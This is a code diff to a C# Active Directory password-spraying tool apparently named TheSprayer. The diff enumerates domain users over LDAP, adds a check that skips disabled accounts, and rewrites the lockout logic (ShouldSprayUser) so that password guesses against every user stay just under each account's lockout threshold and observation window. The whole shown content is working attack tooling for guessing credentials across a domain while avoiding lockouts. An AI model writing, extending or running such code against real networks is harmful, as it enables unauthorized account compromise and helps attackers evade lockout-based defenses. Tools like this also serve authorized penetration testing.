@@ -143,10 +143,10 @@ namespace TheSprayer
 
             int pageCount = 0;
             // Get specific attributes. There's a heap that aren't relevant and when there are tons of users it will lessen the load on the DC
-            string[] attributes = { "userPrincipalName", "sAMAccountName", "distinguishedName", "givenName", "sn", "description", "lastLogon", "badPwdCount", "badPasswordTime", "logonCount", "pwdLastSet", "accountExpires", "createTimeStamp", "ADsPath", "company", "objectSid", "sIDHistory", "adminDescription", "msDS-ResultantPSO" };
+            string[] attributes = { "userPrincipalName", "sAMAccountName", "distinguishedName", "givenName", "sn", "description", "lastLogon", "badPwdCount", "badPasswordTime", "logonCount", "pwdLastSet", "accountExpires", "createTimeStamp", "ADsPath", "company", "objectSid", "sIDHistory", "adminDescription", "msDS-ResultantPSO", "userAccountControl" };
             // LDAP Filter to get all domain users. This needs to be modified but works for testing.
 
-            string filter = "(&(objectCategory=person)(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=2))";
+            string filter = "(&(objectCategory=person)(objectClass=user))";
             // Initiate a new LDAP connection.
             // todo: initiate LDAPS connection if LDAP fails
             LdapConnection connection = new(new LdapDirectoryIdentifier(_domainController, 389, false, false));
@@ -206,7 +206,8 @@ namespace TheSprayer
                             Company = entry.Attributes.GetIfExists("company"),
                             ObjectSid = entry.Attributes.GetIfExists("objectSid"),
                             SidHistory = entry.Attributes.GetIfExists("sIDHistory"),
-                            AdminDescription = entry.Attributes.GetIfExists("adminDescription")
+                            AdminDescription = entry.Attributes.GetIfExists("adminDescription"),
+                            Disabled = !IsUserActive(entry.Attributes.GetIfExists<int>("userAccountControl"))
                         });
                     }
                 } while (prc.Cookie.Length != 0);
@@ -219,6 +220,11 @@ namespace TheSprayer
             return adUsers;
         }
 
+        public bool IsUserActive(int userAccountControlValue)
+        {
+            return !Convert.ToBoolean(userAccountControlValue & 0x0002);
+        }
+
         public void SprayPasswords(string[] passwords, int attemptsToLeave = 2, string outputFile = null)
         {
             var defaultPasswordPolicy = GetPasswordPolicy();
@@ -229,7 +235,7 @@ namespace TheSprayer
             List<ActiveDirectoryUser> filteredUsers = new();
             foreach(var user in users)
             {
-                if (!IsUserCloseToLockout(user, defaultPasswordPolicy, fineGrainedPasswordPolicies, attemptsToLeave))
+                if (ShouldSprayUser(user, defaultPasswordPolicy, fineGrainedPasswordPolicies, attemptsToLeave))
                 {
                     filteredUsers.Add(user);
                 }
@@ -237,7 +243,7 @@ namespace TheSprayer
 
             foreach (var password in passwords)
             {
-                Console.WriteLine($"Trying password {password} against {filteredUsers.Count} users");
+                Console.WriteLine($"Trying password {password} against {filteredUsers.Count} users...");
                 foreach (var user in filteredUsers.ToList())
                 {
                     if (TryValidateCredentials(user.SamAccountName, password, out var message))
@@ -253,7 +259,7 @@ namespace TheSprayer
                     {
                         user.BadPasswordAttempts++;
                         user.LastBadPasswordTime = DateTime.Now;
-                        if(IsUserCloseToLockout(user, defaultPasswordPolicy, fineGrainedPasswordPolicies, attemptsToLeave))
+                        if(!ShouldSprayUser(user, defaultPasswordPolicy, fineGrainedPasswordPolicies, attemptsToLeave))
                         {
                             filteredUsers.Remove(user);
                         }
@@ -262,7 +268,7 @@ namespace TheSprayer
             }
         }
 
-        public bool IsUserCloseToLockout(ActiveDirectoryUser user, PasswordPolicy defaultPasswordPolicy, List<PasswordPolicy> fineGrainedPasswordPolicies, int attemptsToLeave = 2)
+        public bool ShouldSprayUser(ActiveDirectoryUser user, PasswordPolicy defaultPasswordPolicy, List<PasswordPolicy> fineGrainedPasswordPolicies, int attemptsToLeave = 2)
         {
             var policyName = user.PasswordPolicyName;
             PasswordPolicy policy;
@@ -275,29 +281,40 @@ namespace TheSprayer
                 policy = fineGrainedPasswordPolicies.FirstOrDefault(p => p.Name == policyName);
             }
 
+            if (user.Disabled)
+            {
+                return false;
+            }
+
             if (policy == null) // Fine grained policy that we can't see :(
             {
                 // Fine grained password policy detected but not readable, skipping user.
+                return false;
             }
             else if (policy.LockoutThreshold == 0) //We can go forever :D
             {
-                // $"Spraying {user.SamAccountName}. No lockout limits."
-                return false;
+                // Spraying {user.SamAccountName}. No lockout limits.
+                return true;
             }
             else
             {
                 var remainingAttempts = policy.LockoutThreshold - user.BadPasswordAttempts;
-                if (remainingAttempts >= attemptsToLeave || user.LastBadPasswordTime < DateTime.Now.AddMinutes(-1 * policy.ObservationWindow))
+                if (remainingAttempts >= attemptsToLeave)
                 {
-                    //$"Spraying {user.SamAccountName}. Attempts before lockout: {remainingAttempts}"
-                    return false;
+                    // Spraying {user.SamAccountName}. Attempts before lockout: {remainingAttempts}
+                    return true;
+                }
+                else if(user.LastBadPasswordTime < DateTime.Now.AddMinutes(-1 * policy.ObservationWindow))
+                {
+                    // User hasn't had an incorrect password in at least the observation window, we can try again
+                    return true;
                 }
                 else
                 {
                     // User is too close to being locked, skipping.
+                    return false;
                 }
             }
-            return true;
         }
 
         public bool TryValidateCredentials(string username, string password)
